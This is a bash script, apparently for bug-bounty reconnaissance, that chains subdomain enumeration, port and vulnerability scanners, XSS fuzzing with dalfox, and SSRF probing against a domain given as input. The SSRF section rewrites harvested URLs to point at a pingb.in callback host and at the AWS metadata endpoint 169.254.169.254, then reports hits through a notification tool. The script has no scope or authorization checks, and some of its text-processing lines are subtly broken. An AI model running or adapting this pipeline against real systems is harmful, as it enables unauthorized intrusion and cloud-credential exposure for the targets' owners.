#!/bin/bash

#ARGS

domain=$1

#Setup
printf "===================================\nScanning $domain\n===================================" > flag.txt
notify --bulk -data flag.txt
rm flag.txt
mkdir -p $domain $domain/subdomains $domain/scanners $domain/intel
sub_enum(){
touch $domain/subdomains/findomain.txt
findomain -t $domain --threads 100 -o $domain/subdomains/findomain.txt & sublist3r -d $domain -o $domain/subdomains/sublist3r.txt & subfinder -d $domain -o $domain/subdomains/subfinder.txt & assetfinder -subs-only $domain -v | tee $domain/subdomains/assetfinder.txt & gobuster dns -t 500 -w ./all.txt -d $domain -o $domain/subdomains/gobusterdns.txt & wait

cat $domain/subdomains/*.txt > $domain/subdomains/all.txt
sort $domain/subdomains/all.txt | uniq -u $domain/subdomains/all.txt > $domain/subdomains/output.txt
cat $domain/subdomains/output.txt | sed 's/www.//' > $domain/subdomains/nowww.txt
sort $domain/subdomains/nowww.txt | uniq > $domain/subdomains/subdomains.txt
httpx -l $domain/subdomains/subdomains.txt -o $domain/subdomains/httpx.txt
cat $domain/subdomains/httpx.txt | sed 's/http[s]\?:\/\///' > $domain/subdomains/nmap_formatted_list_http.txt
cd $domain/subdomains/
rm sublist3r.txt
rm subfinder.txt
rm assetfinder.txt
rm all.txt
rm output.txt
rm nowww.txt
rm gobusterdns.txt
rm findomain.txt
notify --bulk -data nmap_formatted_list_http.txt
echo "$(wc -l httpx.txt | sed 's/httpx.txt//') alive subdomains found" | notify
cd ../../

echo "\`\`\`Subdomain enumeration ended - ($domain)\`\`\`" | notify
}
nikto_scan(){
nikto -h http://$domain -o $domain/scanners/nikto.txt
notify --bulk -data ./$domain/scanners/nikto.txt
echo "\`\`\`Nikto scan ended - ($domain)\`\`\`" | notify
}
nmap_scan(){
nmap --script vuln -iL $domain/subdomains/nmap_formatted_list_http.txt -o $domain/scanners/nmap.txt
notify --bulk -data ./$domain/scanners/nmap.txt
echo "\`\`\`Nmap scan ended - ($domain)\`\`\`" | notify
}
nuclei_scan(){
nuclei -t ./nuclei-templates/ -o $domain/scanners/nuclei.txt -l $domain/subdomains/httpx.txt
notify --bulk -data ./$domain/scanners/nuclei.txt
echo "\`\`\`Nuclei scan ended - ($domain)\`\`\`" | notify
}
param_reflection(){
python3 ./ParamSpider/paramspider.py -d $domain -o $domain.txt
cat output/$domain.txt | sed 's/FUZZ//' | Gxss > $domain/intel/reflected_parameters.txt
cat ./$domain/intel/reflected_parameters.txt | sed 's/Gxss//' > $domain/intel/reflected_parameters_clean.txt
rm $domain/intel/reflected_parameters.txt
notify --bulk -data $domain/intel/reflected_parameters_clean.txt
echo "\`\`\`Reflected parameters scan ended - ($domain)\`\`\`" | notify
}
xss_check(){
dalfox file $domain/subdomains/httpx.txt --mass > $domain/scanners/dalfox.txt 
dalfox file $domain/intel/reflected_parameters_clean.txt --mass > $domain/scanners/dalfox_reflected.txt
notify --bulk -data $domain/scanners/dalfox.txt
notify --bulk -data $domain/scanners/dalfox_reflected.txt
echo "\`\`\`Dalfox scan ended - ($domain)\`\`\`" | notify
}
ssrf_check(){
echo "\`\`\`Gathering URLs from $domain\`\`\`" | notify
waybackurls $domain >> $domain/intel/urls.txt
gau -subs $domain >> $domain/intel/urls.txt

cat $domain/intel/urls.txt | sort -u | anew | httpx >> $domain/intel/testurls.txt
rm $domain/intel/urls.txt
echo "$(wc -l $domain/intel/testurls.txt | sed 's/$domain/intel/testurls.txt//')urls found" | notify
echo "\`\`\`Testing for Blind SSRF on $domain\`\`\`" | notify
cat $domain/intel/testurls.txt | qsreplace "http://pingb.in/p/936ed688aa80d085baab9392b58c" >> blindssrftest.txt
ffuf -c -w blindssrftest.txt -u FUZZ
rm blindssrftest.txt
echo "Testing for SSRF in AWS" | notify
cat $domain/intel/testurls.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! % " | notify'
rm $domain/intel/testurls.txt 
}
port_scan(){
nmap -iL $domain/subdomains/subdomains.txt -p- -T4 -vv -sCV -o $domain/intel/ports.txt
echo "Port scan ended - ($domain)" | notify
}

param_reflection & ssrf_check & port_scan & nmap_scan & nikto_scan & nuclei_scan & wait
xss_check
echo "\`\`\`$domain scan ended\`\`\`" | notify
